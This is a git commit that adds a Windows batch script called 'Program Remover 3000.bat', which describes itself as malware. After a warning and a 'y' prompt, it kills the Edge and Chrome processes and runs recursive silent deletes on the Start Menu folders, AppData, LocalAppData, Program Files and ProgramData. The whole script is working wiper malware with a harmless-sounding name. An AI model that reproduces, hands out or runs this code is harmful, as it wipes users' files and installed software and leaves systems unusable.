58c2ef8ff8a2d44f3f171013d423800dd20b5db7
XPower7125 <64551044+XPower7125@users.noreply.github.com>
2024-08-06 16:47:21 +0200

    Add wipers

---
+++ Program Remover 3000.bat
@@ -0,0 +1,18 @@
+@echo off
+set /P choice=This malware will COMPLETELY wipe the user folder and the rest of your OS. Please don't run it unless you REALLY know what you are doing. If know what you are doing press y
+
+if "%choice%"=="y" goto wiper
+exit
+
+:wiper
+echo This malware runs better if it's NOT in your user directory and running as administrator.
+pause
+ver
+taskkill /f /im msedge.exe
+taskkill /f /im chrome.exe
+del /s /q "%appdata%\microsoft\windows\start menu"
+del /s /q "C:\programdata\microsoft\windows\start menu"
+del /s /q %appdata%
+del /s /q %localappdata%
+del /s /q "C:\program files"
+del /s /q C:\programdata
